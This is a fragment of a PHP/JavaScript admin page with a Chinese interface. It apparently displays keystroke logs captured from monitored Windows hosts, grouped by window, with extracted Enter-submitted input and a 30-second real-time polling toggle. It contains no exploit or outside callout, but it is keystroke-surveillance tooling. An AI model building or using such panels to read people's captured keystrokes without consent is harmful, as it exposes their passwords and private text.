                ${inputs.length ? `<span class="wd-badge wd-badge--green" style="margin-left:2px">${inputs.length} 提交</span>` : ''}
            </td>
            <td class="wd-sm" style="max-width:280px;overflow:hidden;line-height:2">${preview}</td>
            <td><button class="wd-btn wd-btn--xs wd-btn--ghost" onclick="showWinInput(${escHtml(JSON.stringify(w.name))})">详情</button></td>
        </tr>`;
    }).join('');
    document.getElementById('logs-total').textContent = '共 ' + entries.length + ' 个窗口';
}

window.showWinInput = function(winName) {
    const w = _winInputCache[winName];
    if (!w) return;
    const body  = document.getElementById('log-detail-body');
    const title = document.getElementById('log-detail-title');
    title.textContent = '窗口输入：' + winName;
    const inputs = extractInputs(w.allText);
    let html = `<div style="margin-bottom:14px">
        <div style="font-weight:600;margin-bottom:4px;color:#8be9fd">🪟 ${escHtml(winName)}</div>
        <div style="font-size:12px;color:#777;margin-bottom:8px">${w.logs.length} 条记录 · 最后活跃：${w.lastTime}</div>
        <div style="background:#16161a;padding:10px;border-radius:6px;line-height:2.5;word-break:break-all">${renderKeyLog(w.allText)}</div>
    </div>`;
    if (inputs.length) {
        html += `<div>
            <div style="font-weight:600;margin-bottom:6px;color:#f4f99d">⌨ Enter 提交内容（${inputs.length} 条）</div>
            <div style="background:#16161a;border-radius:6px;overflow:hidden">`;
        inputs.forEach((inp, i) => {
            html += `<div style="padding:7px 12px;border-bottom:1px solid #2a2a2d">
                <span class="wd-muted wd-sm">[${i+1}]</span>
                <span style="font-family:monospace;margin-left:6px">${escHtml(inp)}</span>
            </div>`;
        });
        html += '</div></div>';
    } else {
        html += `<div class="wd-muted wd-sm" style="margin-top:8px">（未检测到 Enter 提交内容）</div>`;
    }
    body.innerHTML = html;
    body.style.whiteSpace = 'normal';
    openModal('log-detail-modal');
};

function toggleWinRealtime(on) {
    if (winRealtimeTimer) { clearInterval(winRealtimeTimer); winRealtimeTimer = null; }
    if (on) {
        winRealtimeTimer = setInterval(pullWinEvents, 30000);
        WD.toast('实时监控已开启（每 30 秒自动拉取）','success',2000);
    } else {
        WD.toast('实时监控已关闭','success',1500);
    }
}

setHead(currentType);
if (currentType === 'login') document.getElementById('win-event-section').style.display = '';
initHosts();
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
